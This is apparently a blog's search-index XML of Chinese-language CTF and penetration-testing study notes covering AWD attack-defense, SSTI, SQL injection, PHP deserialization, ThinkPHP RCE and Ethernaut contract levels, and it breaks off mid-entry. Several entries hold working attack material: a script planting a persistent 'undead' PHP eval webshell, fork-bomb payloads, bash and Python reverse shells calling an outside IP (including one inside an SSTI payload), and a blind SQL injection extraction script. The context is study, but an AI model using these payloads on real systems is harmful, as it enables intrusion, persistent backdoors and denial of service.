<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>awd</title>
    <link href="/2020/11/19/awd/"/>
    <url>/2020/11/19/awd/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-refer"><a href="#0x00-refer" class="headerlink" title="0x00 refer"></a>0x00 refer</h1><p><a href="https://www.jagger2zr.com/2019/08/30/AWD%E8%B5%B7%E6%89%8B%E5%BC%8F%E5%8F%8A%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://www.jagger2zr.com/2019/08/30/AWD%E8%B5%B7%E6%89%8B%E5%BC%8F%E5%8F%8A%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/</a></p><h1 id="0x0起手"><a href="#0x0起手" class="headerlink" title="0x0起手"></a>0x0起手</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>压缩命令：<code>tar -zcvf www.tar.gz .</code></p><p>解压命令：tar -xvxf <a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a> -C .</p><p>也可直接xshell转，一般很快</p><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>cd /var/lib/mysql</p><p>mysqldump -u root -p Test&gt;Test0809.sql</p><p>mysql -u root -p Test&lt;Test0809.sql，输入密码即可（将要恢复的数据库文件放到服务器的某个目录下，并进入这个目录执行以上命令|）</p><pre><code class="hljs jboss-cli">mysqldump -uroot -p <span class="hljs-params">--single-transaction</span> <span class="hljs-params">--all-databases</span> &gt; backup.sql <span class="hljs-comment">#所有</span>mysqldump -u root -p <span class="hljs-params">--single-transaction</span> dataname &gt; dataname.sql <span class="hljs-comment">#单个</span><span class="hljs-comment">#遇到加锁的情况：</span>mysqldump <span class="hljs-params">--skip-lock-tables</span> -uxxxx -p -h 166.111.9.173 -R urlevent20180319 &gt; <span class="hljs-string">./backup.sql</span>`mysqldump -h127.0.0.1 -uroot -ppassword database |gzip &gt; $backupDir/$database-$today.sql.gz`</code></pre><p>授权</p><pre><code class="hljs sql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">TO</span> root@localhost <span class="hljs-keyword">IDENTIFIED</span> <span class="hljs-keyword">BY</span> <span class="hljs-string">"ysx123456"</span>;<span class="hljs-keyword">flush</span> <span class="hljs-keyword">privileges</span>;</code></pre><h3 id="改密码"><a href="#改密码" class="headerlink" title="改密码"></a>改密码</h3><pre><code class="hljs sql"><span class="hljs-keyword">update</span> mysql.user <span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span>=<span class="hljs-keyword">PASSWORD</span>(<span class="hljs-string">'123456'</span>) <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">'root'</span>;<span class="hljs-keyword">flush</span> <span class="hljs-keyword">privileges</span>;</code></pre><h2 id="0x02-权限控制"><a href="#0x02-权限控制" class="headerlink" title="0x02 权限控制"></a>0x02 权限控制</h2><h4 id="写不死马"><a href="#写不死马" class="headerlink" title="写不死马"></a>写不死马</h4><ul><li><p>eval型</p><pre><code class="hljs perl">def write_memery_webshell(url, directory, password):     sleep_time = <span class="hljs-number">500</span> <span class="hljs-comment"># micro second </span>    code = <span class="hljs-string">"&lt;?php $content = '&lt;?php eval(base64_decode($_REQUEST[%s]));?&gt;'; $writable_path = '%s'; $filename = '.%s.php'; $path = $writable_path.'/'.$filename; ignore_user_abort(true); set_time_limit(0);      while(true)&#123; if(file_get_contents($path) != $content)&#123; file_put_contents($path, $content); &#125; usleep(%d); &#125;?&gt;"</span> % (password, directory, password, sleep_time)    filename = <span class="hljs-string">".%s.php"</span> % (password)    path = <span class="hljs-string">"%s/%s"</span> % (directory, filename)    payload = <span class="hljs-string">"file_put_contents('%s', base64_decode('%s'));"</span> % (path, code.encode(<span class="hljs-string">"base64"</span>).replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">""</span>))     <span class="hljs-keyword">print</span> payload     <span class="hljs-keyword">return</span> code_exec(url, payload).<span class="hljs-keyword">split</span>(<span class="hljs-string">"\n"</span>)[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>]</code></pre></li><li><p>命令型</p></li></ul><pre><code class="hljs perl">def write_memery_webshell(url, directory, password):     sleep_time = <span class="hljs-number">500</span> <span class="hljs-comment"># micro second </span>    code = <span class="hljs-string">"&lt;?php                                       ?&gt;'; $writable_path = '%s'; $filename = '.%s.php'; $path = $writable_path.'/'.$filename; ignore_user_abort(true); set_time_limit(0); while(true)&#123;      if(file_get_contents($path) != $content)&#123; file_put_contents($path, $content); &#125; usleep(%d); &#125;?&gt;"</span> % (password, directory, password, sleep_time)     filename = <span class="hljs-string">".%s.php"</span> % (password)     path = <span class="hljs-string">"%s/%s"</span> % (directory, filename)     payload = <span class="hljs-string">"file_put_contents('%s', base64_decode('%s'));"</span> % (path, code.encode(<span class="hljs-string">"base64"</span>).replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">""</span>))     <span class="hljs-keyword">return</span> shell_exec(url, payload).<span class="hljs-keyword">split</span>(<span class="hljs-string">"\n"</span>)[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>]</code></pre><ul><li>唤醒内存马</li></ul><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">active_memery_webshell</span><span class="hljs-params">(url)</span>:</span>     <span class="hljs-keyword">try</span>:         requests.get(url, timeout=<span class="hljs-number">0.5</span>)     <span class="hljs-keyword">except</span>:         <span class="hljs-keyword">print</span> <span class="hljs-string">"[+] OK!"</span></code></pre><h4 id="fork炸弹"><a href="#fork炸弹" class="headerlink" title="fork炸弹"></a>fork炸弹</h4><ul><li><p>eval型</p><pre><code class="hljs routeros">def eval_fork(ip):     host = ip   <span class="hljs-built_in"> port </span>= <span class="hljs-string">"80"</span>     url = <span class="hljs-string">"http://%s:%s/code.php"</span> % (host, port)     code = <span class="hljs-string">"system(\"echo '.() &#123; .|.&amp; &#125; &amp;&amp; .' &gt; /tmp/aaa\");system(\"/bin/bash /tmp/aaa\");echo \"seems good!\";"</span>     data = &#123;<span class="hljs-string">'pass'</span>:code&#125;    requests.post(url, <span class="hljs-attribute">data</span>=data)</code></pre></li><li><p>命令型</p><pre><code class="hljs routeros">def shell_fork(ip):     host = ip   <span class="hljs-built_in"> port </span>= <span class="hljs-string">"80"</span>     url = <span class="hljs-string">"http://%s:%s/c.php"</span> % (host, port)     command = <span class="hljs-string">":()&#123; :|: &amp; &#125;;:"</span>     shell_exec(url, command)</code></pre></li></ul><h2 id="0x03-流量"><a href="#0x03-流量" class="headerlink" title="0x03 流量"></a>0x03 流量</h2><h3 id="脏流量"><a href="#脏流量" class="headerlink" title="脏流量"></a>脏流量</h3>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基本功</title>
    <link href="/2020/11/16/%E5%9F%BA%E6%9C%AC%E5%8A%9F/"/>
    <url>/2020/11/16/%E5%9F%BA%E6%9C%AC%E5%8A%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>感觉文件上传这一块姿势点比较好理解，刷完 uploads-lab 的话，基本姿势就掌握差不多了。</p><ul><li><del>%00 截断</del></li><li><del>非常规后缀绕过</del></li><li>.htaccess 解析绕过</li><li><del>图片头效果</del></li><li><del>MIME 绕过</del></li><li><del>前端绕过</del></li><li>二次渲染绕过</li><li><del>条件竞争绕过</del></li><li>multipart/form-data 绕过</li></ul><h2 id="文件包含-下载"><a href="#文件包含-下载" class="headerlink" title="文件包含/下载"></a>文件包含/下载</h2><p>文件包含的话，基本上单独总结一下也是可以快速学习理解的，所以短板不多，但不代表没有。</p><ul><li><del>文件包含原理</del></li><li><del>本地文件包含突破后缀</del></li><li><del>远程文件包含突破后缀</del></li><li><del>PHP 文件包含配合伪协议</del></li><li><del>文件包含 Web 日志</del></li><li><del>文件包含 Sessions</del></li><li><del>文件包含 SSH 日志</del></li><li>文件包含配合 phpinfo()</li><li>文件包含配合系统 proc 进程</li><li>文件包含 require_once 绕过</li></ul><h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><p><img src="/neiwang/test.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssti</title>
    <link href="/2020/11/14/ssti/"/>
    <url>/2020/11/14/ssti/</url>
    
    <content type="html"><![CDATA[<h3 id="绕过类型"><a href="#绕过类型" class="headerlink" title="绕过类型"></a>绕过类型</h3><pre><code class="hljs markdown">&#123;&#123; eval popen &#123;% if request[<span class="hljs-string">'application'</span>][<span class="hljs-symbol">'__globals__'</span>][<span class="hljs-string">'__builtins__'</span>][<span class="hljs-symbol">'__import__'</span>]('os')[<span class="hljs-string">'popen'</span>](<span class="hljs-link">'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM</span>);s.connect((\"129.211.9.7\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="hljs-string">\"/bin/sh\",\"-i\"</span>]);"')[<span class="hljs-string">'read'</span>](<span class="hljs-link"></span>)%&#125; a &#123;% endif %&#125;</code></pre><p>注意弹shell用python弹</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2020/11/14/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2020/11/14/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><ul><li><del>MySQL 基础语法</del></li><li>MySQL 相关函数</li><li><del>MySQL UNION 联合查询注入</del></li><li><del>MySQL 报错注入</del></li><li><del>MySQL 布尔类型盲注</del></li><li><del>MySQL 延时类型盲注</del></li><li>MySQL 堆叠注入</li><li><del>MySQL 二次注入</del></li><li>MySQL DNSLog 外带数据</li><li>MySQL 异或注入</li><li><del>MySQL 注入常规 Bypass 技巧</del></li><li>MySQL 注入进阶 Bypass 技巧</li><li><del>SQLMap 基础使用</del></li><li>SQLMap 进阶使用</li><li>SQLMap Tamper 编写</li><li>MSSQL 学习</li><li>Oracle 学习</li><li>MSSQL 注入深入理解</li><li>Oracle 注入深入理解</li></ul><h3 id="格式化注入"><a href="#格式化注入" class="headerlink" title="格式化注入"></a>格式化注入</h3><p>sprinf引起</p><p>当%数量和参数数量相等时，由前到后替换，当%数量多于$时,we need special characters $</p><p>When we use %1$ means it will replace at first,and after that if we use sprint % and \ after it will be cleaned which means our ‘ will  get out and results sql injection.</p><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> re<span class="hljs-comment"># from urllib import parse</span>url = <span class="hljs-string">'http://eci-2ze006f3h1dki6w6m8h5.cloudeci1.ichunqiu.com/index.php'</span><span class="hljs-comment"># params = 'input=O:4:"flag":2:&#123;s:2:"ip";O:2:"ip":1:&#123;s:2:"ip";s:6:"127.00";&#125;s:5:"check";s:19:"key****************";&#125;'</span>flag=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">999</span>):    low = <span class="hljs-number">32</span>    high = <span class="hljs-number">127</span>    <span class="hljs-keyword">while</span> low &lt; high:        mid = (low + high) // <span class="hljs-number">2</span>        sql= <span class="hljs-string">'(ascii(mid((select x.1 from(select 1 union select * from fl4g)x limit 1,1),&#123;&#125;,1))&gt;&#123;&#125;)'</span>        data = &#123;<span class="hljs-string">"username"</span>: <span class="hljs-string">"admin"</span>, <span class="hljs-string">"password"</span>: <span class="hljs-string">"%1$' || "</span> + sql.format(i, mid) + <span class="hljs-string">"#"</span>&#125;        text = requests.post(url=url,data=data).text        code = re.findall(<span class="hljs-string">r' &lt;strong&gt;(.*)&lt;/strong&gt;'</span>,text,re.S)        code = code[<span class="hljs-number">0</span>]        <span class="hljs-comment">#print(code)</span>        <span class="hljs-comment">#print(code) &lt;strong&gt;&lt;/strong&gt;</span>        <span class="hljs-keyword">if</span>(<span class="hljs-string">"Success!"</span> <span class="hljs-keyword">in</span> code):            low = mid + <span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            high = mid    flag += chr(low)    print(flag)<span class="hljs-comment">#if((ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=databse()),0,1))&gt;1),"n1ctf",1) #--大概会用2S时间</span></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>弹shell的方式</title>
    <link href="/2020/11/14/%E5%BC%B9shell%E7%9A%84%E6%96%B9%E5%BC%8F/"/>
    <url>/2020/11/14/%E5%BC%B9shell%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><p>bash -i &gt;&amp; /dev/tcp/129.211.9.7/8888 0&gt;&amp;1</p><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>python3 -c \‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“129.211.9.7”,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);\‘</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ai_learn</title>
    <link href="/2020/11/02/ai-learn/"/>
    <url>/2020/11/02/ai-learn/</url>
    
    <content type="html"><![CDATA[<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1>]]></content>
    
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>larvel</title>
    <link href="/2020/09/01/larvel/"/>
    <url>/2020/09/01/larvel/</url>
    
    <content type="html"><![CDATA[<h2 id="laravel5-8-RCE分析"><a href="#laravel5-8-RCE分析" class="headerlink" title="laravel5.8 RCE分析"></a>laravel5.8 RCE分析</h2><p>起环境</p><pre><code class="hljs dsconfig"><span class="hljs-string">composer </span><span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">laravel/</span><span class="hljs-string">laravel </span><span class="hljs-string">blog </span><span class="hljs-string">"5.8.0"</span></code></pre><p>起服务</p><pre><code class="hljs ebnf"><span class="hljs-attribute">php artisan serve</span></code></pre><p>为啥子要这样起？？？</p><p><img src="/img/vul/4.png" srcset="/img/loading.gif" alt=""></p><p>在 <code>laravel58/routes/web.php</code> 文件添加路由</p><pre><code class="hljs arduino">Route::<span class="hljs-built_in">get</span>(<span class="hljs-string">"/"</span>,<span class="hljs-string">"\App\Http\Controllers\DemoController@demo"</span>);</code></pre><p>然后就变成这样</p><p><img src="/img/vul/5.png" srcset="/img/loading.gif" alt=""></p><p>是不是很像ctf赛题了？</p><p><a href="https://xz.aliyun.com/t/6059" target="_blank" rel="noopener">https://xz.aliyun.com/t/6059</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>laravel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列</title>
    <link href="/2020/08/28/%E5%8F%8D%E5%BA%8F%E5%88%97/"/>
    <url>/2020/08/28/%E5%8F%8D%E5%BA%8F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>一直想找个时间强化下专题训练，反序列在实战代码审计中用的挺多的，但我一直都没有好好强化过，连一条很短的pop链都构造不出来，这两天好好强化下。</p><h2 id="0x01-从基础开始"><a href="#0x01-从基础开始" class="headerlink" title="0x01 从基础开始"></a>0x01 从基础开始</h2><p>利用serialize将一个对象转化为字符串形式。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<span class="hljs-keyword">public</span> $name = <span class="hljs-string">'d3vil'</span>;<span class="hljs-keyword">protected</span> $age = <span class="hljs-number">18</span>;<span class="hljs-keyword">private</span> $sex = <span class="hljs-string">'boy'</span>;&#125;$a = <span class="hljs-keyword">new</span> A();print_r($a);<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;$ser_a = serialize($a);print_r($ser_a);</code></pre><p>得到的结果是</p><p>A Object (    [name] =&gt; d3vil    [age:protected] =&gt; 18    [sex:A:private] =&gt; boy )<br>O:1:”A”:3:{s:4:”name”;s:5:”d3vil”;s:6:”*age”;i:18;s:6:”Asex”;s:3:”boy”;}</p><p>O代表是一个类实例化对象</p><p>1是类名称长度</p><p>A是类名称</p><p>有3个成员属性</p><p>s代表字符串</p><p>长度为4的name</p><p>值是长度为5的d3vil</p><p>注意后面两个属性，一个是protected,一个是private</p><p>我们用urlencode之后看看</p><p>O%3A1%3A%22A%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A5%3A%22d3vil%22%3Bs%3A6%3A%22%00%2A%00age%22%3Bi%3A18%3Bs%3A6%3A%22%00A%00sex%22%3Bs%3A3%3A%22boy%22%3B%7D</p><p>在protected属性中，键名前要加%00%2A%00age，也就是\x00*\x00，这也是键名长度为6的原因，在private键名前要加\x00类名\x00。</p><pre><code class="hljs lasso">三者区别<span class="hljs-keyword">public</span>(公共的):在本类内部、外部类、子类都可以访问<span class="hljs-keyword">protect</span>(受保护的):只有本类或子类或父类中可以访问<span class="hljs-keyword">private</span>(私人的):只有本类内部可以使用可以看出，<span class="hljs-keyword">protect</span>是只是不让外部访问，<span class="hljs-keyword">private</span>是只能本类访问。所以$a -&gt; sex = <span class="hljs-string">'123'</span>;这种方式只有<span class="hljs-keyword">public</span>才行，在构造链子的时候，如果要改其他两个直接在类函数里加</code></pre><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>定义：反序列化就是利用<code>unserailize()</code>函数将一个经过序列化的字符串还原成php代码形式</p><h4 id="反序列化漏洞原理"><a href="#反序列化漏洞原理" class="headerlink" title="反序列化漏洞原理"></a>反序列化漏洞原理</h4><p>在反序列的时候会调用魔术方法</p><pre><code class="hljs less"><span class="hljs-selector-tag">__construct</span>()当一个对象创建时被调用<span class="hljs-selector-tag">__destruct</span>()当一个对象销毁时被调用<span class="hljs-selector-tag">__toString</span>()当反序列化后的对象被输出的时候(转化为字符串的时候)被调用<span class="hljs-selector-tag">__sleep</span>() 在对象在被序列化之前运行<span class="hljs-selector-tag">__wakeup</span>将在序列化之后立即被调用</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>ctf 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub</title>
    <link href="/2020/07/16/vulhub/"/>
    <url>/2020/07/16/vulhub/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><h3 id="vulhub是一个集成好漏洞环境的开源项目"><a href="#vulhub是一个集成好漏洞环境的开源项目" class="headerlink" title="vulhub是一个集成好漏洞环境的开源项目"></a>vulhub是一个集成好漏洞环境的开源项目</h3><p>接下来，将跟着环境进行复现调试。</p><h1 id="0x01-thinkphp-2-rce"><a href="#0x01-thinkphp-2-rce" class="headerlink" title="0x01 thinkphp/2-rce/"></a>0x01 <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp" target="_blank" rel="noopener">thinkphp</a>/<strong>2-rce</strong>/</h1><p>index.php?s=/index/index/name/${@phpinfo()}</p><p><img src="/vul/1.png" srcset="/img/loading.gif" alt=""></p><p>顺便研究下框架</p><ol><li><p>先是去加载thinkphp，thinkphp会记录一些加载时间和变量环境定义，如tp2要求php大于5，然后去加载runtime</p></li><li><p>PHPSTORM格式化代码快捷键：</p><p>windows平台：Ctrl+Alt+L</p></li><li><p>runtime，然后定义一些变量，加载一些方法。</p></li><li><p>ThinkPHP的util里放了一些类方法，里面有一些处理session等的类</p><p><img src="/vul/2.png" srcset="/img/loading.gif" alt=""></p></li><li><p>可以看到经过一波瞎jb调试后我来到了漏洞点，他是在处理路由的时候发生的，经过C方法一大堆配置后，调用dispatch方法，</p></li></ol><p>又检查了一大堆路由的配置，然后默认规则调度URL，在</p><pre><code class="hljs autoit">$res = preg_replace(<span class="hljs-string">'@(\w+)'</span>.$depr.<span class="hljs-string">'([^'</span>.$depr.<span class="hljs-string">'\/]+)@e'</span>, <span class="hljs-string">'$var[\'</span>\\<span class="hljs-number">1</span>\<span class="hljs-string">']="\\2";'</span>, implode($depr,$paths))<span class="hljs-comment">;</span>正则是@(\w+)/([^/\/]+)<span class="hljs-symbol">@e</span></code></pre><p>匹配路由的paths也就是name/${@phpinfo()}</p><p>有点奇怪，一般用的是/作为分隔符但这里由于表达式里有/所以用@分割而且式子中匹配${@phpinfo()}的是[^//]也就是只要不是/就可以了,那为何写俩？</p><p><img src="/img/vul/3.png" srcset="/img/loading.gif" alt=""></p><p>然后就会执行命令</p><p>可以看出，tp的方法是先用thinkphp去初始化模块，再用runtime去调用一些类方法如app类，先init配置路由等信息，再exec调用对应的model和action</p><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span> (!preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span>^[A-Za-<span class="hljs-params">z_0</span>-9]+$<span class="hljs-operator">/</span>', MODULE_NAME)</span>) &#123;    throw<span class="hljs-constructor">_exception(L('<span class="hljs-params">_MODULE_NOT_EXIST_</span>')</span>);&#125;先是匹配<span class="hljs-keyword">module</span> name，必须要是英文和数字</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>solidity</title>
    <link href="/2020/06/20/solidity/"/>
    <url>/2020/06/20/solidity/</url>
    
    <content type="html"><![CDATA[<h1 id="Ethernaut"><a href="#Ethernaut" class="headerlink" title="Ethernaut"></a>Ethernaut</h1><p>本篇将从这个平台开始，并且尝试用合约的方式进行交互完成，因为ctf中大部分都是要合约交互的。</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>第一关主要是讲一些abi的调用方式。</p><p>源码</p><pre><code class="hljs typescript">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.18</span>;contract Instance &#123;  <span class="hljs-built_in">string</span> <span class="hljs-keyword">public</span> password;  uint8 <span class="hljs-keyword">public</span> infoNum = <span class="hljs-number">42</span>;  <span class="hljs-built_in">string</span> <span class="hljs-keyword">public</span> theMethodName = <span class="hljs-string">'The method name is method7123949.'</span>;  bool <span class="hljs-keyword">private</span> cleared = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// constructor</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Instance</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> _password</span>) <span class="hljs-title">public</span> </span>&#123;    password = _password;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">info</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">string</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">'You will find what you need in info1().'</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">info1</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">string</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">'Try info2(), but with "hello" as a parameter.'</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">info2</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> param</span>) <span class="hljs-title">public</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">string</span></span>) </span>&#123;    <span class="hljs-keyword">if</span>(keccak256(param) == keccak256(<span class="hljs-string">'hello'</span>)) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-string">'The property infoNum holds the number of the next info method to call.'</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-string">'Wrong parameter.'</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">info42</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">string</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">'theMethodName is the name of the next method.'</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">method7123949</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">string</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">'If you know the password, submit it to authenticate().'</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">authenticate</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> passkey</span>) <span class="hljs-title">public</span> </span>&#123;    <span class="hljs-keyword">if</span>(keccak256(passkey) == keccak256(password)) &#123;      cleared = <span class="hljs-literal">true</span>;    &#125;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCleared</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params">bool</span>) </span>&#123;    <span class="hljs-keyword">return</span> cleared;  &#125;&#125;</code></pre><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span> contract.address<span class="hljs-meta">&gt;&gt;</span> <span class="hljs-string">"0x077ba30f5810b179f9ac0b0de5d2968023809d80"</span></code></pre><p>函数修饰词</p><blockquote><p>view function</p><ul><li><p>Modifying state variables.</p></li><li><p>Emitting events.</p></li><li><p>Creating other contracts.</p></li><li><p>Using selfdestruct.</p></li><li><p>Sending Ether via calls.</p></li><li><p>Calling any function which is not marked view or pure.</p></li><li><p>Using low-level calls.</p></li><li><p>Using inline assembly containing certain opcodes.</p></li><li><pre><code>pragma solidity ^0.4.21;contract constantViewPure{    string name;    uint public age;    function constantViewPure() public{        name = &quot;liushiming&quot;;        age = 29;    }    function getAgeByConstant() public constant returns(uint){        age += 1;  //声明为constant，在函数体中又试图去改变状态变量的值，编译会报warning, 但是可以通过        return age;  // return 30, 但是！状态变量age的值不会改变，仍然为29！    }     function getAgeByView() public view returns(uint){        age += 1; //view和constant效果一致，编译会报warning，但是可以通过        return age; // return 30，但是！状态变量age的值不会改变，仍然为29！    }    function getAgeByPure() public pure returns(uint){        return age; //编译报错！pure比constant和view都要严格，pure完全禁止读写状态变量！        return 1;    }}<pre><code class="hljs">![](/img/block/1.png)需要注意的是，静态方法不需要gas，应为不需要合约，图中为蓝色的就是静态方法可以秒get状态变量和返回值，而黄色的是需要交互的，并且可以改变合约的状态变量，需要矿工来验证的，那么就需要支付gas并确定。第一关主要是如何和合约交互![](/img/block/2.png)也可以用控制台内进行交互，可以看到contract对象下的所有东西，应为这个是和我们的插件交互过的，所以也可以敲player拿到自己的地址，也可以看到这个对象下的方法，在控制台下调用（这个是这个网站写的js吧？ctf中经常需要我们自己写合约交互，所以我就不依赖这个了。）也可以看到这个abi。<span class="hljs-attribute">abi大概写了：</span><span class="hljs-attribute"></span>- 是否是个constant类的方法- 参数怎么样？有几个？- 函数名？- return- 是否可支付？接收ether## 0x01第一关开始讲一些已知的实际漏洞 </code></pre>pragma solidity ^0.4.18;</code></pre></li></ul></blockquote><p>import ‘zeppelin-solidity/contracts/ownership/Ownable.sol’;<br>import ‘openzeppelin-solidity/contracts/math/SafeMath.sol’;</p><p>contract Fallback is Ownable {</p><p>  using SafeMath for uint256;<br>  mapping(address =&gt; uint) public contributions;</p><p>  function Fallback() public {<br>    contributions[msg.sender] = 1000 * (1 ether);<br>  }</p><p>  function contribute() public payable {<br>    require(msg.value &lt; 0.001 ether);<br>    contributions[msg.sender] = contributions[msg.sender].add(msg.value);<br>    if(contributions[msg.sender] &gt; contributions[owner]) {<br>      owner = msg.sender;<br>    }<br>  }</p><p>  function getContribution() public view returns (uint) {<br>    return contributions[msg.sender];<br>  }</p><p>  function withdraw() public onlyOwner {<br>    owner.transfer(this.balance);<br>  }</p><p>  function() payable public {<br>    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>    owner = msg.sender;<br>  }<br>}</p><pre><code class="hljs plain">放在remix里一大堆报错，把函数内容全删了只留函数声明。</code></pre><p> =&gt; Instance address  0xb1544a094bcb84692709a08553c7e670a1ba2ed4</p><pre><code class="hljs shell">过关条件1. you claim ownership of the contract2. you reduce its balance to 0ok，思路清晰了，要成为合约owner，并且balance为0要想成为owner：1. 贡献1000eth？？？？给爷爬2. 调用fallback函数。<span class="hljs-meta">&gt;</span><span class="bash"> <span class="hljs-comment">### Fallback</span></span><span class="hljs-meta">&gt;</span><span class="hljs-meta">&gt;</span><span class="bash"> //</span><span class="hljs-meta">&gt;</span><span 